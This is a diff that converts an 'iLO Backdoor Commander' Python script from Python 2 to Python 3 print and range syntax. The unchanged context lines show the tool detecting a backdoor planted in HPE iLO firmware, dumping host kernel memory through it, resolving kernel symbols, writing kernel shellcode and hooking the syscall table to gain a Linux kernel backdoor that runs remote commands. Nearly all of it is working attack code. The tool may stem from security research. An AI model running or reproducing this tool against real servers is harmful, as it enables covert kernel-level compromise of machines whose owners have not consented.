@@ -8,7 +8,7 @@ import code
 import time
 
 if len(sys.argv) < 2:
-    print "[-] usage: %s remote_addr" % sys.argv[0]
+    print("[-] usage: %s remote_addr" % sys.argv[0])
     sys.exit(1)
 
 class iLOBackdoorCommander:
@@ -25,7 +25,7 @@ class iLOBackdoorCommander:
 	self.detect_backdoor()
 
     def help(self):
-	print """
+	print("""
 ==============================================================================
 
 Welcome to the iLO Backdoor Commander.
@@ -43,7 +43,7 @@ Example:
 
 ==============================================================================
 
-"""
+""")
 	 
     def p64(self, x):
 	return pack("<Q",x)
@@ -59,14 +59,14 @@ Example:
 	try:
 	    r = requests.get(xml_url, verify=False)
 	except:
-	    print "[-] Connection error"
+	    print("[-] Connection error")
 	    sys.exit(1)
 	if r.status_code != 200:
 	    return ""
     
 	self.ilo_version = r.content.split("FWRI")[1][1:-2]
 
-	print "[*] Found iLO version %s" % self.ilo_version
+	print("[*] Found iLO version %s" % self.ilo_version)
 	return self.ilo_version
 	
     def dump_memory(self, addr, count):
@@ -85,9 +85,9 @@ Example:
 
 	r = requests.get(dump_url, verify=False)
 	if r.status_code != 200:
-	    print "[-] Dump failed"
+	    print("[-] Dump failed")
 	    if len(r.content) > 0:
-		print "\t%s" % r.content
+		print("\t%s" % r.content)
 	    sys.exit(1)
 
 	return r.content[:asked_count]
@@ -103,16 +103,16 @@ Example:
 
 	r = requests.get(write_url, verify=False)
 	if r.status_code != 200:
-	    print "[-] Dump failed"
+	    print("[-] Dump failed")
 	    if len(r.content) > 0:
-		print "\t%s" % r.content
+		print("\t%s" % r.content)
 		sys.exit(1)
 
 	return r.content
 
     def write_memory(self, addr, data):
 	wdata = ""
-	for x in xrange(0, len(data), 0x80):
+	for x in range(0, len(data), 0x80):
 	    wdata += self.write_memory_128(addr+x, data[x:x+0x80])
 	return wdata
 
@@ -125,7 +125,7 @@ Example:
 	    off2 = self.kdata.find(self.p64(vaddr))
 	    if off2 != -1:
 		ptr = self.u64(self.kdata[off2-8:])
-		print "[+] Found %s @0x%x" % (func,ptr)
+		print("[+] Found %s @0x%x" % (func,ptr))
 		return ptr
 	    off_abs += off + 1
 	    off = self.kdata[off_abs:].find(func + "\0")
@@ -141,7 +141,7 @@ Example:
 	    sym_addr = self.resolve_func(sym_name)
 	    self.add_symbol(sym_name, sym_addr)
 	except:
-	    print "[-] Fail resolving symbol %s" % sym_name
+	    print("[-] Fail resolving symbol %s" % sym_name)
 	    sys.exit(1)
 	
     def get_kernel_symbols(self):
@@ -156,11 +156,11 @@ Example:
 		break
 
 	sys_call_table_virt = sys_call_table + self.kbase
-	print "[+] Found syscall table @0x%x" % (sys_call_table_virt)
+	print("[+] Found syscall table @0x%x" % (sys_call_table_virt))
 	self.add_symbol("sys_call_table", sys_call_table_virt)
 
 	sys_read_ptr = self.u64(self.kdata[sys_call_table:])
-	print "[+] Found sys_read @0x%x" % sys_read_ptr
+	print("[+] Found sys_read @0x%x" % sys_read_ptr)
 	self.add_symbol("sys_read", sys_read_ptr)
 
 	self.get_symbol("call_usermodehelper")
@@ -187,27 +187,27 @@ Example:
 	self.backdoor_url = "%s/backd00r.htm" % self.ilo_url
 	r = requests.get(self.backdoor_url, verify=False)
 	if r.status_code != 400:
-	    print "[-] iLO Backdoor not detected"
+	    print("[-] iLO Backdoor not detected")
 	else:
-	    print "[+] iLO Backdoor found"
+	    print("[+] iLO Backdoor found")
 	    self.backdoor_status = 1
 	    data = self.dump_memory(self.pkbase, 0xc)
 	    if data[:3] == 'ILO':
-		print "[+] Linux Backdoor found"
+		print("[+] Linux Backdoor found")
 		self.shared_page_addr = self.u64(data[4:])
 		self.backdoor_status = 2
 	    else:
-		print "[-] Linux Backdoor not detected"
+		print("[-] Linux Backdoor not detected")
     
     def install_linux_backdoor(self):
 	if self.backdoor_status == 0:
-	    print "[-] Missing iLO Backdoor..."
+	    print("[-] Missing iLO Backdoor...")
 	    return
 	elif self.backdoor_status == 2:
-	    print "[*] Linux kernel backdoor already in place"
+	    print("[*] Linux kernel backdoor already in place")
 	    return
 	if self.kdata is None:
-	    print "[*] Dumping kernel..."
+	    print("[*] Dumping kernel...")
 	    dump_count = 0x1000000
 
 	    self.kdata = self.dump_memory(self.pkbase, dump_count)
@@ -215,7 +215,7 @@ Example:
 		f.write(self.kdata)
 	    #self.kdata = open("/tmp/kdata.bin","rb").read()
 
-	    print "[+] Dumped %x bytes!" % len(self.kdata)
+	    print("[+] Dumped %x bytes!" % len(self.kdata))
 
 	self.get_kernel_symbols()
 	self.kshellcode = self.asm_kshellcode()
@@ -224,39 +224,39 @@ Example:
 	wdata = self.write_memory(self.symbols["serial8250_do_pm"]["paddr"], self.kshellcode)
 	
 	if wdata != self.kshellcode:
-	    print "[-] Data mismatch (1)"
+	    print("[-] Data mismatch (1)")
 
 	to_write = self.p64(self.symbols["serial8250_do_pm"]["vaddr"])
 	wdata = self.write_memory(self.symbols["sys_call_table"]["paddr"], to_write)
 
 	if wdata != to_write:
-	    print "[-] Data mismatch (2)"
+	    print("[-] Data mismatch (2)")
 
-	print "[+] Shellcode written"
+	print("[+] Shellcode written")
 
 	self.write_memory(self.pkbase, "ILO " + self.p64(self.symbols["serial8250_do_pm"]["paddr"] + 2))
 	self.detect_backdoor()
 
     def setup_channel(self):
 	if self.shared_page_addr is None:
-	    print "[-] Don't know where to read shared page address..."
+	    print("[-] Don't know where to read shared page address...")
 	    return
 	data = self.dump_memory(self.shared_page_addr, 16)
 	ppage, vpage = unpack_from("<2Q", data)
 	if ppage != 0x4141414141414141:
-	    print "[+] Found shared memory page! 0x%x / 0x%x" % (ppage, vpage)
+	    print("[+] Found shared memory page! 0x%x / 0x%x" % (ppage, vpage))
 	    self.shared_page = ppage
 	
     def cmd(self, my_cmd):
 	if self.backdoor_status != 2:
-	    print "[-] Linux kernel backdoor required"
+	    print("[-] Linux kernel backdoor required")
 	    return
 
 	if self.shared_page is None:
 	    self.setup_channel()
 
 	if self.shared_page is None:
-	    print "[-] Communication channel is down"
+	    print("[-] Communication channel is down")
 	    return
 
 	self.write_memory(self.shared_page + 0x10, my_cmd + "\x00")
@@ -275,26 +275,26 @@ Example:
 	    timer2 = int(time.time())
 
 	if available_output != 1:
-	    print "[-] Command timed out..."
+	    print("[-] Command timed out...")
 	    return
 
 	command_output = self.dump_memory(self.shared_page + 0x1020, output_len)
 
 	self.write_memory(self.shared_page + 0x1010, self.p64(0) + self.p64(0))
 
-	print command_output
+	print(command_output)
 	
 
     def remove_linux_backdoor(self):
 	if self.backdoor_status != 2:
-	    print "[-] Linux kernel backdoor required"
+	    print("[-] Linux kernel backdoor required")
 	    return
 
 	if self.shared_page is None:
 	    self.setup_channel()
 
 	if self.shared_page is None:
-	    print "[-] Communication channel is down"
+	    print("[-] Communication channel is down")
 	    return
 
 	self.write_memory(self.shared_page, self.p64(0xdead))
